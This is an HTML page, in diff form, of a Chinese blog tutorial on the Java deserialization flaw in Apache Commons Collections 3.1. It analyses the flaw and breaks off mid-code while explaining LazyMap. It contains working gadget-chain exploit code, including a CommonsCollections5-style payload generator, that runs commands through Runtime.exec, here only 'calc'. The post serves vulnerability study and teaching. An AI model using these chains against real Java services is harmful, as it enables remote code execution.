@@ -1,0 +1,949 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>Java 反序列化漏洞始末（1）— Apache Commons - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="序列化要了解反序列化漏洞，首先要对java的序列化有一定的了解。java 可以将一个对象序列化成 JVM 认识的字节序列，这个字节序列里包含了该对象的数据，主要以对象属性为主。当你再 A 平台序..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="Java 反序列化漏洞始末（1）— Apache Commons &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/166.html" />
+<link rel="alternate" type="application/rdf+xml" title="Java 反序列化漏洞始末（1）— Apache Commons &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/166.html" />
+<link rel="alternate" type="application/atom+xml" title="Java 反序列化漏洞始末（1）— Apache Commons &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/166.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-166'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-166'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-166'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _6tz = ''///*'N'*/'N'
++'6'//'zQ'
++''///*'Pf'*/'Pf'
++//'jB'
+'2f1'+'0'//'0'
++'00'//'af'
++''///*'1'*/'1'
++/* 'j'//'j' */''+'8'//'6'
++//'yu6'
+'b6b'+/* '4'//'4' */''+//'dw'
+'f'+'9'//'Xh'
++//'F'
+'62'+/* 'ezT'//'ezT' */''+//'OCW'
+'20'+'6'//'J5c'
++//'Zp'
+'69e'+//'sl'
+'6d'+'9b5'//'SJ6'
++'f'//'BY'
++''///*'o'*/'o'
++//'P8'
+'1fd'+'30'//'w4'
++//'N'
+'N'+'N'//'N'
++'5'//'F'
+, _gih = [[4,5],[31,32],[31,32]];
+    
+    for (var i = 0; i < _gih.length; i ++) {
+        _6tz = _6tz.substring(0, _gih[i][0]) + _6tz.substring(_gih[i][1]);
+    }
+
+    return _6tz;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">Java 反序列化漏洞始末（1）— Apache Commons</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2019-06-25 17:18:00" itemprop="datePublished">2019-06-25 17:18:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/166.html"><a href="https://b1ue.cn/category/vul/">漏洞</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/166.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <h1>序列化</h1><p>要了解反序列化漏洞，首先要对java的序列化有一定的了解。</p><p>java 可以将一个对象序列化成 JVM 认识的字节序列，这个字节序列里包含了该对象的数据，主要以对象属性为主。</p><p>当你再 A 平台序列化出的对象，在 B 平台上反序列化出来同样的对象。</p><h2>序列化一个对象</h2><p>被序列化的类必须要实现 Serializable 接口，否则将无法序列化对象。</p><pre><code>public class Person implements Serializable{
+
+    public String name;
+    public int length;
+
+}</code></pre><pre><code>public class Main {
+
+    public static void main(String[] args) throws IOException {
+
+        Person person = new Person();
+
+        person.length = 18;
+        person.name = &quot;blue&quot;;
+
+        PrintStream out = System.out;
+
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(out);
+        objectOutputStream.writeObject(person);
+        objectOutputStream.flush();
+        objectOutputStream.close();
+
+    }
+
+}</code></pre><p>序列化对象时使用对象输出流“ObjectOutputStream”，往指定输出流里写入 person 对象，这里我用的是控制台，可以直观的看到对象序列化后的样子。</p><p><img src="/usr/uploads/2019/06/11652100.jpg" alt="1561455117(1).jpg" title="1561455117(1).jpg"></p><pre><code>simple.Person  Ɨ       I  lengthL  namet  Ljava/lang/String;xp    t  blue</code></pre><p>这堆“乱码”就是序列化的内容了，懂 Java 的人可以看出来除了，类名，属性，和属性值以外还有 JNI 字段描述符，一眼基本上可以看出个大概来。</p><h1>反序列化</h1><pre><code>/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9cfef0e9f9dcf5e4eff9ffb2f3eefb">[email&#160;protected]</a>
+ * @since 2019/6/25 17:15
+ */
+public class Main {
+
+    public static void main(String[] args) throws IOException, ClassNotFoundException {
+
+        Person person = new Person();
+
+        person.length = 18;
+        person.name = &quot;blue&quot;;
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流
+
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(person);//序列化对象
+        objectOutputStream.flush();
+        objectOutputStream.close();
+
+        byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
+
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+        Object o = objectInputStream.readObject(); //将byte数组输入流反序列化
+
+        System.out.println(o);
+
+
+    }
+
+}
+</code></pre><p>为保证完整性，这里我将对象序列化成byte数组。再用“ObjectInputStream”反序列化回来。</p><p><img src="/usr/uploads/2019/06/1759659088.jpg" alt="1561455810(1).jpg" title="1561455810(1).jpg"></p><p>输出这个反序列化后的对象，和我们一开始给 person 对象设定的属性值完全一样。</p><p>其实在最后 readObject() 那一步调用的同时，会调用 person 对象的 readObject() 方法。</p><pre><code>public class Person implements Serializable{
+
+    public String name;
+    public int length;
+
+    @Override
+    public String toString() {
+        return &quot;Person{&quot; +
+                &quot;name='&quot; + name + '\'' +
+                &quot;, length=&quot; + length +
+                '}';
+    }
+
+    private void readObject(java.io.ObjectInputStream in)throws IOException,ClassNotFoundException
+    {
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    }
+
+}</code></pre><p>Person 类写一个 readObject 方法上去，当对象被反序列化的时候，该方法就会被调用。</p><h1>漏洞在哪儿?</h1><p>理论上来说这样并不能构成漏洞，因为你序列化的仅仅只是对象的属性，并不能控制方法里的代码。那漏洞从何而来？</p><p>这里就要讲一下大家在总结 Java 反序列化漏洞时经常举的例子 “commons-collections-3.1反序列化漏洞”</p><p>这是 Apache 的一个开源工具包，被很多项目所依赖，如果使用了这个版本的 jar 包，正好又有反序列化漏洞，那就可以做到任意命令执行。</p><h1>commons-collections-3.1反序列化漏洞</h1><p>老规矩，先复现，再分析。</p><h1>复现</h1><pre><code>    &lt;dependencies&gt;
+        &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+            &lt;version&gt;3.1&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;</code></pre><p>使用 maven 下载依赖。</p><pre><code>import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.util.HashMap;
+import java.util.Map;
+
+/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4527293020052c3d3620266b2a3722">[email&#160;protected]</a>
+ * @since 2019/6/25 17:11
+ */
+public class SerRce  {
+
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;calc.exe&quot;})
+        };
+
+        //将transformers数组存入ChaniedTransformer这个继承类
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        //创建Map并绑定transformerChina
+        Map innerMap = new HashMap();
+        innerMap.put(&quot;value&quot;, &quot;value&quot;);
+        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+
+        //触发漏洞
+        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
+        onlyElement.setValue(&quot;foobar&quot;);
+
+    }
+
+}</code></pre><p>管他看懂看不懂，先执行一遍再说。</p><p><img src="/usr/uploads/2019/06/3739321224.jpg" alt="1561457316(1).jpg" title="1561457316(1).jpg"></p><p>在 exec 方法处下个断点，可以看到调用栈。</p><h1>分析</h1><p>从上面的代码得知，是因为最终遍历了“outerMap”这个Map对象的 Entry 集合，然后执行了 Entry 对象的的 setValue 方法导致执行了反射链。</p><p>所以先看这个 Map 的实现类 。</p><p>文中调用了一个静态方法<code>org.apache.commons.collections.map.TransformedMap#decorate</code>，这个静态方法又去new了一个TransformedMap对象。map传入的是一个普通的数据，valueTransformer则是构造的调用链。</p><pre><code>public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
+        return new TransformedMap(map, keyTransformer, valueTransformer);
+    }</code></pre><p><code>TransformedMap</code>是一个  Map 接口实现类。它继承了<code>AbstractInputCheckedMapDecorator</code>，</p><p><code>AbstractInputCheckedMapDecorator</code> 继承了 <code>AbstractMapDecorator</code> ,最后实现 Map 接口。</p><p>对象被实例化成功后，依次又调用了4个方法</p><ul><li>entrySet()</li><li>iterator()</li><li>next()</li><li>setValue()</li></ul><p>先来看 entrySet() 方法，<code>TransformedMap</code>类没用，所以去父类里找。</p><pre><code>public Set entrySet() {
+        return (Set)(this.isSetValueChecking() ? new AbstractInputCheckedMapDecorator.EntrySet(super.map.entrySet(), this) : super.map.entrySet());
+    }</code></pre><p>这里去new 了一个内部类 <code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySet#EntrySet</code></p><p><code>EntrySet</code>类中有一个<code>iterator</code>方法，也就是第二步被调用的。</p><pre><code>public Iterator iterator() {
+            return new AbstractInputCheckedMapDecorator.EntrySetIterator(super.collection.iterator(), this.parent);
+        }</code></pre><p>这里又new了一个内部类<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIterator#EntrySetIterator</code></p><p>这个类里的 <code>next()</code> 方法，也就是第三步被调用的。</p><p>同样，又new了一个内部类<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry</code></p><p>里面有最后一步被调用的 setValue() 方法。</p><pre><code>static class MapEntry extends AbstractMapEntryDecorator {
+        private final AbstractInputCheckedMapDecorator parent;
+
+        protected MapEntry(Entry entry, AbstractInputCheckedMapDecorator parent) {
+            super(entry);
+            this.parent = parent;
+        }
+
+        public Object setValue(Object value) {
+            value = this.parent.checkSetValue(value);
+            return super.entry.setValue(value);
+        }
+    }</code></pre><p>在 <code>setValue</code> 的第一行去调用了 <code>checkSetValue</code> 方法。</p><p>实际上调用的是 <code>org.apache.commons.collections.map.TransformedMap#checkSetValue</code></p><pre><code>    protected Object checkSetValue(Object value) {
+        return this.valueTransformer.transform(value);
+    }</code></pre><p>这里去调用了 <code>valueTransformer</code>属性的 <code>transform()</code>方法。</p><p>而 <code>valueTransformer</code> 正是我传入的调用链。</p><pre><code>Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;calc.exe&quot;})
+        };
+
+        //将transformers数组存入ChaniedTransformer这个继承类
+        Transformer transformerChain = new ChainedTransformer(transformers);</code></pre><p>在这部分代码中，transformerChain 变量就是我的调用链。</p><p>它在构造方法里传入了一个Transformer类型的数组，这个数组里包含了 <code>ConstantTransformer</code> 和 <code>InvokerTransformer</code> 两种类型的对象，他们均实现了 <code>Transformer</code> 接口。</p><p>现在来看 <code>transformerChain</code> 的 <code>transform</code> 方法</p><pre><code>public Object transform(Object object) {
+        for(int i = 0; i &lt; this.iTransformers.length; ++i) {
+            object = this.iTransformers[i].transform(object);
+        }
+
+        return object;
+    }</code></pre><p>这里循环调用数组每一个对象的transform方法，并传入object对象，再将执行结果赋值给object对象。</p><p>调用链中<code>InvokerTransformer</code>这个类同样实现了<code>transform</code>方法</p><pre><code>public Object transform(Object input) {
+        if (input == null) {
+            return null;
+        } else {
+            try {
+                Class cls = input.getClass();
+                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
+                return method.invoke(input, this.iArgs);
+            } catch (NoSuchMethodException var5) {
+                throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' does not exist&quot;);
+            } catch (IllegalAccessException var6) {
+                throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' cannot be accessed&quot;);
+            } catch (InvocationTargetException var7) {
+                throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + this.iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' threw an exception&quot;, var7);
+            }
+        }
+    }</code></pre><p>意思就是把构造参数传进来的方法名、参数类型、参数值，通过反射去调用一遍。</p><pre><code>Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc.exe&quot;})
+        };</code></pre><p>所以这段代码意思就很明了了。</p><p>就是通过反射去调用<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code></p><p>总结一下，这个对象是可以被反序列化，但并不会在反序列化时触发调用链，而是要经过迭代器迭代并且使用 setValue() 方法才行，正常情况下基本不会有这种场景。</p><p>不过既然被爆存在漏洞，一定有解决办法。</p><p>网上给出的办法是使用 JDK 的 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 类。</p><pre><code>private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
+        var1.defaultReadObject();
+        AnnotationType var2 = null;
+
+        try {
+            var2 = AnnotationType.getInstance(this.type);
+        } catch (IllegalArgumentException var9) {
+            return;
+        }
+
+        Map var3 = var2.memberTypes();
+        Iterator var4 = this.memberValues.entrySet().iterator();
+
+        while(var4.hasNext()) {
+            Entry var5 = (Entry)var4.next();
+            String var6 = (String)var5.getKey();
+            Class var7 = (Class)var3.get(var6);
+            if (var7 != null) {
+                Object var8 = var5.getValue();
+                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) {
+                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));
+                }
+            }
+        }
+
+    }</code></pre><p>他的 readObject 方法里去遍历的 <code>memberValues</code> 这个成员变量，并且需要被调用的方法通通被调用了。</p><pre><code>AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) {
+        this.type = var1;
+        this.memberValues = var2;
+    }</code></pre><p>不过由于这个类是被保护的，所以需要用反射的方式来实例化。</p><p>最后给出完整代码。</p><pre><code>/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="dfbdb3aaba9fb6a7acbabcf1b0adb8">[email&#160;protected]</a>
+ * @since 2019/6/25 17:15
+ */
+public class Main {
+
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc.exe&quot;})
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        Map map = new HashMap();
+        map.put(&quot;value&quot;, &quot;value&quot;);
+        Map transformedMap = TransformedMap.decorate(map, null, transformerChain);
+
+        Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+        ctor.setAccessible(true);
+        Object instance = ctor.newInstance(Target.class, transformedMap);
+
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流
+
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(instance);//序列化对象
+        objectOutputStream.flush();
+        objectOutputStream.close();
+
+        byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
+
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+        Object o = objectInputStream.readObject(); //将byte数组输入流反序列化
+        System.out.println(o);
+
+
+    }
+
+}</code></pre><p><img src="/usr/uploads/2019/06/2884215649.jpg" alt="1561523366(1).jpg" title="1561523366(1).jpg"></p><p>这里需要注意的一点是，这个地方对jdk 1.7 有效，jdk1.8 就没有执行。</p><p>原因是 jdk1.7 和 jdk1.8 <code>AnnotationInvocationHandler</code> 的 readObject 方法不同。</p><pre><code>private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
+        GetField var2 = var1.readFields();
+        Class var3 = (Class)var2.get(&quot;type&quot;, (Object)null);
+        Map var4 = (Map)var2.get(&quot;memberValues&quot;, (Object)null);
+        AnnotationType var5 = null;
+
+        try {
+            var5 = AnnotationType.getInstance(var3);
+        } catch (IllegalArgumentException var13) {
+            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
+        }
+
+        Map var6 = var5.memberTypes();
+        LinkedHashMap var7 = new LinkedHashMap();
+
+        String var10;
+        Object var11;
+        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
+            Entry var9 = (Entry)var8.next();
+            var10 = (String)var9.getKey();
+            var11 = null;
+            Class var12 = (Class)var6.get(var10);
+            if (var12 != null) {
+                var11 = var9.getValue();
+                if (!var12.isInstance(var11) &amp;&amp; !(var11 instanceof ExceptionProxy)) {
+                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + &quot;[&quot; + var11 + &quot;]&quot;)).setMember((Method)var5.members().get(var10));
+                }
+            }
+        }</code></pre><p>对比会发现最主要的 setValue 方法没有被调用。</p><h1>给 jdk 1.8续命</h1><p>通过 Java 反序列化 Payload 生成神器 <a href="https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads" target="_blank">ysoserial</a> 测试发现。</p><p>CommonsCollections5  CommonsCollections6  CommonsCollections7 是可以在 jdk 1.8 上执行命令的</p><pre><code>/*
+    Gadget chain:
+        ObjectInputStream.readObject()
+            AnnotationInvocationHandler.readObject()
+                Map(Proxy).entrySet()
+                    AnnotationInvocationHandler.invoke()
+                        LazyMap.get()
+                            ChainedTransformer.transform()
+                                ConstantTransformer.transform()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        Class.getMethod()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        Runtime.getRuntime()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        Runtime.exec()
+    Requires:
+        commons-collections
+ */
+/*
+This only works in JDK 8u76 and WITHOUT a security manager</code></pre><p>在 CommonsCollections5 payload生成类中有这样一段注释。</p><p>上面标明了 Gadget 链，需要包含的依赖，和 JDK 版本。</p><h2>CommonsCollections5</h2><p>这个 payload 主要用到了 JDK 的 <code>BadAttributeValueExpException</code> 异常类。</p><p>我先给出我用来生成 payload 的代码。</p><pre><code>/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="46242a3323062f3e35232568293421">[email&#160;protected]</a>
+ * @since 2019/6/25 17:11
+ */
+public class SerRce  {
+
+    public static BadAttributeValueExpException getObject(final String command) throws Exception {
+        final String[] execArgs = new String[] { command };
+        // inert chain for setup
+        final Transformer transformerChain = new ChainedTransformer(
+                new Transformer[]{ new ConstantTransformer(1) });
+        // real chain for after setup
+        final Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        &quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] { String.class }, execArgs),
+                new ConstantTransformer(1) };
+
+        final Map innerMap = new HashMap();
+
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);
+
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+        Field valfield = val.getClass().getDeclaredField(&quot;val&quot;);
+        valfield.setAccessible(true);
+        valfield.set(val, entry);
+        Class&lt;? extends Transformer&gt; aClass = transformerChain.getClass();
+
+        Field iTransformers = aClass.getDeclaredField(&quot;iTransformers&quot;);
+        iTransformers.setAccessible(true);
+        iTransformers.set(transformerChain,transformers);
+
+        return val;
+    }
+
+    public static void main(String[] args) throws Exception {
+
+        BadAttributeValueExpException calc = getObject(&quot;calc&quot;);
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流
+
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(calc);//序列化对象
+        objectOutputStream.flush();
+        objectOutputStream.close();
+
+        byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组
+
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
+        Object o = objectInputStream.readObject(); //将byte数组输入流反序列化
+
+
+    }
+
+}
+</code></pre><p>这个漏洞是在 LazyMap 的 get() 方法被调用时触发的。</p><p>先来尝试运行一个 demo</p><pre><code>Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc.exe&quot;})
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        Map map = new HashMap();
+        map.put(&quot;value&quot;, &quot;value&quot;);
+
+        Map lazyMap = LazyMap.decorate(map, transformerChain);
+        lazyMap.get(&quot;foo&quot;);</code></pre><p>前面的调用链没有什么变化，问题出在 LazyMap 上。</p><p>这里 <code>org.apache.commons.collections.map.LazyMap#decorate(java.util.Map, org.apache.commons.collections.Transformer)</code> new 了一个 LazyMap 对象。</p><pre><code>    public Object get(Object key) {
+        if (!super.map.containsKey(key)) {
+            Object value = this.factory.transform(key); // 这是重点
+            super.map.put(key, value);
+            return value;
+        } else {
+            return super.map.get(key);
+        }
